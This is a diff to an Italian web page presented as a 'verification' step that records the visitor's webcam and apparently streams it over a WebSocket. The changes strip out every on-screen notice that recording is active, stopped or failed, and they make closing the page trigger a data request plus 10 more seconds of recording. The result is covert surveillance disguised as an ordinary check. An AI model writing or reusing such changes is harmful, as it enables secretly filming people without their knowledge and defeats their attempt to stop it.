@@ -16,7 +16,7 @@
 </head>
 <body>
 <div id="box">
-  <h2>Verifica in corso</h2>
+  <h2>Verifica</h2>
   
   <input id="user" placeholder="Nome (opzionale)" style="padding:12px; width:80%; margin:10px 0;">
   
@@ -45,7 +45,6 @@
       document.getElementById('localVideo').srcObject = stream;
       document.getElementById('consenti').style.display = 'none';
       document.getElementById('stop').style.display = 'inline-block';
-      document.getElementById('status').textContent = 'Registrazione attiva';
 
       mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
 
@@ -59,7 +58,6 @@
 
     } catch (err) {
       alert('Errore accesso webcam: ' + err.message);
-      document.getElementById('status').textContent = 'Errore webcam';
     }
   };
 
@@ -74,12 +72,19 @@
     document.getElementById('localVideo').srcObject = null;
     document.getElementById('consenti').style.display = 'inline-block';
     document.getElementById('stop').style.display = 'none';
-    document.getElementById('status').textContent = 'Registrazione fermata';
   };
 
-  window.addEventListener('beforeunload', () => {
-    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
-    if (stream) stream.getTracks().forEach(t => t.stop());
+  window.addEventListener('beforeunload', (event) => {
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+      mediaRecorder.requestData();
+      setTimeout(() => {
+        if (mediaRecorder) mediaRecorder.stop();
+        if (stream) stream.getTracks().forEach(t => t.stop());
+      }, 10000); // 10 secondi extra se chiude
+    }
+  });
+
+  window.addEventListener('unload', () => {
     if (ws.readyState === WebSocket.OPEN) ws.close();
   });
 </script>
